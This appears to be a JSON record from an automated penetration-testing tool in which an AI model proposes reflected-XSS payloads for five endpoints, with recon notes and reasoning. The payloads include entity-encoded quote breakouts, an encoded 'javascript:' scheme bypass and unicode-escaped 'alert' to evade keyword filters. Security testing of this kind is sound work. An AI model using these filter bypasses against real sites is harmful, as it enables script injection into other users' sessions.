@@ -1,0 +1,68 @@
+{
+ "key": "xss_reflected_4",
+ "model": "opencode/glm-5.3-flash-free",
+ "class": "xss_reflected",
+ "variants": [
+  {
+   "endpoint": "GET /catalog/search?kw=tshirt",
+   "target_param": "kw",
+   "recon_evidence": "Sending kw='><x shows the value reflected inside the onfocus attribute of the auto-suggest input, built as onfocus='track(\"kw=...\")'-style markup; quote characters come back HTML-encoded (&apos;) and angle brackets are stripped, but the event attribute itself stays intact and unterminated.",
+   "planner_rationale": "HTML entities decode at attribute-parse time before JS evaluation, so encoded quotes behave like raw breakouts inside event handlers.",
+   "vuln_class": "xss_reflected",
+   "payload": "&apos;-alert(1)-&apos;",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) fires when the suggestion field gains focus; the &apos; entities resolved to real quotes before JS evaluation.",
+   "confidence": 0.85,
+   "reasoning": "The reflection sits inside a single-quoted event handler whose quote characters are entity-encoded rather than removed. Because character references decode before the attribute's JavaScript is compiled, the encoded breakout is functionally identical to one using raw quotes."
+  },
+  {
+   "endpoint": "POST /newsletter/subscribe",
+   "target_param": "email",
+   "recon_evidence": "POST /newsletter/subscribe with email=a'b returns a confirmation row whose label element carries the value inside a paired-quote onmouseover tooltip attribute; quotes surface HTML-encoded and tag-breakout attempts are blocked, leaving runtime entity decoding as the only route out of the attribute.",
+   "planner_rationale": "Runtime attribute decoding makes entity-encoded quotes equal to raw quote breakouts inside event handlers.",
+   "vuln_class": "xss_reflected",
+   "payload": "&apos;-alert(1)-&apos;",
+   "injection_point": "body",
+   "expected_success_signal": "alert(1) executes on mouseover of the styled confirmation element; the &apos; sequences were decoded to genuine quotes before JS parsing.",
+   "confidence": 0.7,
+   "reasoning": "The body-reflected email value lands inside a paired event attribute even though quote characters are HTML-encoded. Browsers decode character references before evaluating attribute JavaScript, so the encoded quote path applies without modification in this endpoint context."
+  },
+  {
+   "endpoint": "GET /outbox/preview?link=https://example.com",
+   "target_param": "link",
+   "recon_evidence": "GET /outbox/preview?link=javascript:alert(1) is rejected with a scheme-violation warning while arbitrary non-scheme text reflects verbatim into an <a> tag's href; repeat testing shows a literal, case-insensitive substring match on 'javascript' in the scheme check.",
+   "planner_rationale": "An entity embedded inside the scheme name evades the literal keyword block because browsers decode entities in attribute values before URL parsing.",
+   "vuln_class": "xss_reflected",
+   "payload": "<a href=\"jav&#x61script:alert(3)\">a</a>",
+   "injection_point": "query",
+   "expected_success_signal": "The rendered 'a' link navigates with a javascript: URL and alert(3) executes on user click despite the scheme filter.",
+   "confidence": 0.8,
+   "reasoning": "The filter performs a plain substring check for 'javascript', which a character reference embedded in the scheme name defeats. Since entity decoding occurs before attribute URLs are parsed, the browser reconstructs the javascript: scheme at run time exactly as intended."
+  },
+  {
+   "endpoint": "POST /reviews/render",
+   "target_param": "snippet",
+   "recon_evidence": "POST /reviews/render with snippet=<img src=x onerror=alert(1)> leaves <img> markup intact but returns a filtered page flagging the literal substring 'alert', which is blocked wherever it appears; the surviving markup still reaches an event-handler attribute in the response.",
+   "planner_rationale": "\\uXXXX escapes compile to the identifier at tokenization time, so keyword blocking of 'alert' does not stop the call.",
+   "vuln_class": "xss_reflected",
+   "payload": "<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />",
+   "injection_point": "body",
+   "expected_success_signal": "The src-less image fires onerror and alert(1) executes even though 'alert' never appears literally in the request.",
+   "confidence": 0.72,
+   "reasoning": "The observed control blocks the literal 'alert' keyword while tolerating img markup, so the handler's function name is rewritten with \\uXXXX escapes that pass filtering during transport. Identifier escapes are resolved during JavaScript tokenization, fully reassembling the call after the attribute value is in place."
+  },
+  {
+   "endpoint": "GET /ui/theme/preview",
+   "target_param": "X-Client-Theme",
+   "recon_evidence": "GET /ui/theme/preview mirrors the X-Client-Theme header verbatim into an inline diagnostic widget's markup; a gateway-level keyword rule blocks any request whose headers contain the literal substring 'alert' (403 observed), yet img tags and their attributes pass through untouched.",
+   "planner_rationale": "Unicode escapes assemble the identifier after transport filtering, so the banned keyword never crosses the filter.",
+   "vuln_class": "xss_reflected",
+   "payload": "<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />",
+   "injection_point": "header",
+   "expected_success_signal": "The src-less image triggers onerror and alert(1) executes although the token 'alert' never appears literally in the header or response.",
+   "confidence": 0.6,
+   "reasoning": "The echoed header reaches markup where event-handler content executes as JavaScript, and the only observed control is a literal-keyword rule applied during transmission. Writing the identifier with \\uXXXX escapes sidesteps that transmission-time check, and the identifier reassembles when the handler is tokenized."
+  }
+ ],
+ "raw_tail": ",\n    \"confidence\": 0.6,\n    \"reasoning\": \"The echoed header reaches markup where event-handler content executes as JavaScript, and the only observed control is a literal-keyword rule applied during transmission. Writing the identifier with \\\\uXXXX escapes sidesteps that transmission-time check, and the identifier reassembles when the handler is tokenized.\"\n  }\n]\n\u001b[0m\n> build · glm-5.3-flash-free\n"
+}
